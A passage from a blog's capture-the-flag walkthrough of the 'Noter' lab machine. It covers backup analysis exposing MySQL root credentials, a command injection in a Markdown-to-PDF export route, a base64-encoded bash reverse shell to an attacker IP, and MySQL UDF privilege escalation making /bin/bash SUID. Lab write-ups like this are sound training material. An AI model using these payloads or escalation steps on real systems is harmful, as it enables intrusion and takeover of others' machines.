      641  12-23-2021 14:57   templates/layout.html
      466  12-16-2021 19:29   templates/add_note.html
      467  12-17-2021 14:55   templates/edit_note.html
     1036  12-21-2021 16:16   templates/vip_dashboard.html
      521  12-17-2021 22:32   templates/login.html
---------                     -------
    70459                     25 files
</code></pre></div><p>But if we check differences, we see that the <code>app.py</code> is different (they hace differenc CRC values):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">diff</span> <span class="code-dark-magenta">&lt;(</span><span class="code-dark-green">unzip</span> -v <span class="mtku">app_backup_1638395546.zip</span><span class="code-dark-magenta">)</span> <span class="code-dark-magenta">&lt;(</span><span class="code-dark-green">unzip</span> -v <span class="mtku">app_backup_1635803546.zip</span><span class="code-dark-magenta">)</span>  
1c1
&lt; Archive:  app_backup_1638395546.zip
---
&gt; Archive:  app_backup_1635803546.zip
4c4
&lt;    13507  Defl:N     3138  77% 12-26-2021 22:49 f64d2c7c  app.py
---
&gt;     9178  Defl:N     2399  74% 12-26-2021 22:48 5c7d6fd3  app.py
30c30
&lt;    70459            22018  69%                            25 files
---
&gt;    66130            21279  68%                            25 files
</code></pre></div><h2 id="static-code-analysis">Static code analysis</h2><p>The interesting lines of code of <code>app_backup_1635803546/app.py</code> are some database credentials:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/python3</span>

<span class="mtk3"># imports</span>

<span class="mtk1">app</span><span class="mtk1"> </span><span class="mtk5">=</span> <span class="mtku mtk8">Flask</span>(<span class="mtk1">__name__</span><span class="mtk1">)</span>

<span class="mtk3"># Config MySQL</span>
<span class="mtk1">app</span><span class="mtk1">.config[</span><span class="mtk4">'MYSQL_HOST'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'localhost'</span>
<span class="mtk1">app</span><span class="mtk1">.config[</span><span class="mtk4">'MYSQL_USER'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'root'</span>
<span class="mtk1">app</span><span class="mtk1">.config[</span><span class="mtk4">'MYSQL_PASSWORD'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'Nildogg36'</span>
<span class="mtk1">app</span><span class="mtk1">.config[</span><span class="mtk4">'MYSQL_DB'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'app'</span>
<span class="mtk1">app</span><span class="mtk1">.config[</span><span class="mtk4">'MYSQL_CURSORCLASS'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'DictCursor'</span>  

<span class="mtk3"># init MySQL</span>
<span class="mtk1">mysql</span><span class="mtk1"> </span><span class="mtk5">=</span> <span class="mtku mtk8">MySQL</span>(<span class="mtk1">app</span><span class="mtk1">)</span>

<span class="mtk3"># ...</span>
</code></pre></div><p>In <code>app_backup_1635803546/app.py</code> these credentials are different, but don&rsquo;t appear to be correct. Moreover, we have the code used to export notes from Markdown to PDF:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/export_note_local/&lt;string:id&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">])</span>
<span class="mtk8">@</span><span class="mtk8">is_logged_in</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">export_note_local</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8">check_VIP</span><span class="mtk1">(</span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">]):</span>

<span class="mtk1">        </span><span class="mtk1">cur</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">mysql</span><span class="mtk1">.connection.cursor()</span>

<span class="mtk1">        </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cur</span><span class="mtk1">.execute(</span><span class="mtk4">"SELECT * FROM notes WHERE id = </span><span class="mtk6">%s</span><span class="mtk4"> and author = </span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, (</span><span class="mtk9 mtki">id</span><span class="mtk1">,</span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'username'</span><span class="mtk1">]))</span>  

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">note</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cur</span><span class="mtk1">.fetchone()</span>

<span class="mtk1">            </span><span class="mtk1">rand_int</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">random</span><span class="mtk1">.</span><span class="mtk1">randint</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span><span class="mtk6">10000</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">command</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">"node misc/md-to-pdf.js  $'</span><span class="mtk6">{</span><span class="mtk1">note</span><span class="mtk1">[</span><span class="mtk4">'body'</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4">' </span><span class="mtk6">{</span><span class="mtk1">rand_int</span><span class="mtk6">}</span><span class="mtk4">"</span>
<span class="mtk1">            </span><span class="mtk8 mtku">subprocess</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk1">command</span><span class="mtk1">, </span><span class="mtk9 mtki">shell</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">executable</span><span class="mtk5">=</span><span class="mtk4">"/bin/bash"</span><span class="mtk1">)</span>
<span class="mtk1">        </span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">send_file</span><span class="mtk1">(</span><span class="mtk1">attachment_dir</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk1">rand_int</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk4">'.pdf'</span><span class="mtk1">, </span><span class="mtk9 mtki">as_attachment</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>

<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'dashboard.html'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk8">abort</span><span class="mtk1">(</span><span class="mtk6">403</span><span class="mtk1">)</span>
</code></pre></div><h2 id="foothold-on-the-machine">Foothold on the machine</h2><p>Here we have a command injection vulnerability, because we can exit from the single quotes and inject a system command:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">            </span><span class="mtk8 mtku">subprocess</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk1">command</span><span class="mtk1">, </span><span class="mtk9 mtki">shell</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">, </span><span class="mtk9 mtki">executable</span><span class="mtk5">=</span><span class="mtk4">"/bin/bash"</span><span class="mtk1">)</span>  
</code></pre></div><p>Just like this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; body = "'; whoami; echo '"
&gt;&gt;&gt; command = f"node misc/md-to-pdf.js  $'{body}' {1337}"  
&gt;&gt;&gt; command
"node misc/md-to-pdf.js  $''; whoami; echo '' 1337"
</code></pre></div><p>So we can get a reverse shell on the machine.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx
</code></pre></div><p>This is the payload we need to enter in a note:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">'; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash; echo '  
</code></pre></div><p>Then we export it as PDF and we get the connection back in <code>nc</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.160.
Ncat: Connection from 10.10.11.160:60110.
bash: cannot set terminal process group (257434): Inappropriate ioctl for device  
bash: no job control in this shell
svc@noter:~/app/web$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
svc@noter:~/app/web$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
svc@noter:~/app/web$ export TERM=xterm
svc@noter:~/app/web$ export SHELL=bash
svc@noter:~/app/web$ stty rows 50 columns 158
</code></pre></div><p>At this point, we can get the <code>user.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc@noter:~/app/web$ cd
svc@noter:~$ cat user.txt
92d9fa6e5b473e1696d8ce38214a5dc6  
</code></pre></div><h2 id="system-enumeration">System enumeration</h2><p>Basic enumeration only shows that there is a <code>backup.sh</code> script in <code>/opt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc@noter:~$ ls -la /opt
total 12
drwxr-xr-x  2 root root 4096 May  2 23:05 <span class="code-blue">.</span>
drwxr-xr-x 19 root root 4096 May  2 23:05 <span class="code-blue">..</span>
-rwxr--r--  1 root root  137 Dec 30  2021 <span class="code-green">backup.sh</span>
svc@noter:~$ cat /opt/backup.sh
#!/bin/bash
zip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\*  
</code></pre></div><p>But it does not seem to be run by other user.</p><p>If we use <a href="https://github.com/carlospolop/PEASS-ng"><code>linpeas.sh</code></a>, we can see that MySQL is configured to run as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-blue">╔══════════╣</span> <span class="code-green">Searching mysql credentials and exec</span>
From '/etc/<span class="code-blue">mysql</span>/mariadb.conf.d/50-server.cnf' Mysql user: user    = <span class="code-red">root</span>  
Found readable /etc/mysql/my.cnf
[client-server]
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/
</code></pre></div><p>This is an issue because we can execute commands as <code>root</code> using User Defined Functions (UDF). This <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">blog post</a> shows the necessary files and steps to complete the exploit. We will need this <a href="https://www.exploit-db.com/exploits/1518">C program</a>.</p><h2 id="privilege-escalation">Privilege escalation</h2><p>We only need to follow the steps of the <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">blog post</a>.</p><p>First, we download and compile the exploit as stated:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc@noter:~$ cd /tmp
svc@noter:/tmp$ wget -q 10.10.17.44/raptor_udf2.c
svc@noter:/tmp$ gcc -g -c raptor_udf2.c
svc@noter:/tmp$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc  
</code></pre></div><p>To access MySQL we can use the credentials found in <code>app.py</code>. Then, we can continue with exploitation to set <code>/bin/bash</code> to be a SUID binary:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc@noter:/tmp$ mysql --user=root --password=Nildogg36
<span class="code-white">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span>
<span class="code-white">Your MariaDB connection id is 12759</span>
<span class="code-white">Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04</span>

<span class="code-white">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span>

<span class="code-white">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span>

MariaDB [(none)]&gt; show variables like '%plugin%';
+-----------------+---------------------------------------------+
| Variable_name   | Value                                       |
+-----------------+---------------------------------------------+
| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |
| plugin_maturity | gamma                                       |
+-----------------+---------------------------------------------+
<span class="code-white">2 rows in set (0.001 sec)</span>

MariaDB [(none)]&gt; show variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
<span class="code-white">1 row in set (0.001 sec)</span>

MariaDB [(none)]&gt; use mysql;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

<span class="code-white">Database changed</span>
MariaDB [mysql]&gt; create table foo(line blob);
<span class="code-white">Query OK, 0 rows affected (0.005 sec)</span>

MariaDB [mysql]&gt; insert into foo values(load_file('/tmp/raptor_udf2.so'));
<span class="code-white">Query OK, 1 row affected (0.002 sec)</span>

MariaDB [mysql]&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';  
<span class="code-white">Query OK, 1 row affected (0.001 sec)</span>

MariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so';
<span class="code-white">Query OK, 0 rows affected (0.001 sec)</span>

MariaDB [mysql]&gt; select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
<span class="code-white">1 row in set (0.000 sec)</span>

MariaDB [mysql]&gt; select do_system('chmod 4755 /bin/bash');
+-----------------------------------+
| do_system('chmod 4755 /bin/bash') |
+-----------------------------------+
|                                 0 |
+-----------------------------------+
<span class="code-white">1 row in set (0.003 sec)</span>

MariaDB [mysql]&gt; exit
<span class="code-white">Bye
</code></pre></div><p>And now <code>/bin/bash</code> is SUID:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc@noter:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 <span class="code-white code-bg-red">/bin/bash</span>  
</code></pre></div><p>So we can run Bash as <code>root</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">svc@noter:/tmp$ bash -p
bash-5.0# cat /root/root.txt
55410fc79784d12a27222bcce0528f14  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#ftp-enumeration">FTP enumeration</a></li><li><a href="#static-code-analysis">Static code analysis</a></li><li><a href="#foothold-on-the-machine">Foothold on the machine</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>